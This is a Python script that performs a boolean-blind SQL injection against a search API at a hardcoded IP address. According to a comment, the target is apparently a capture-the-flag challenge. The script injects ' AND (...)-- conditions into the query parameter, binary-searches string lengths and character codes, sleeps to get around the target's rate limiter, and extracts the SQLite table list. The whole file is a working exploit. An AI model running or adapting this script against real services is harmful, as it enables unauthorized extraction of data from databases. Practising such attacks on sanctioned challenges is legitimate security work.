import requests
import time

URL = "http://72.61.231.171:9100/api/search"

# Keep this conservative because the challenge has a rate limiter.
DELAY = 1.2

def oracle(condition):
    while True:
        r = requests.get(
            URL,
            params={"q": f"' AND ({condition})--"},
            timeout=10
        )

        data = r.json()

        if "error" in data:
            if "Rate limit" in data["error"]:
                print("[!] Rate limited; waiting...")
                time.sleep(10)
                continue
            raise RuntimeError(data)

        time.sleep(DELAY)
        return data.get("found") is True


def get_number(expr, lo=0, hi=10000):
    while lo < hi:
        mid = (lo + hi) // 2

        if oracle(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid

    return lo


def extract(expr):
    length = get_number(f"length(({expr}))", 0, 10000)
    print(f"[*] Length: {length}")

    out = ""

    for pos in range(1, length + 1):
        # Extract as a Unicode code point.
        value = get_number(
            f"unicode(substr(({expr}),{pos},1))",
            0,
            127
        )

        ch = chr(value)
        out += ch

        print(f"\r[*] {out}", end="", flush=True)

    print()
    return out


schema = extract(
    "SELECT group_concat(name,'|') "
    "FROM sqlite_master WHERE type='table'"
)

print("\nTABLES:", schema)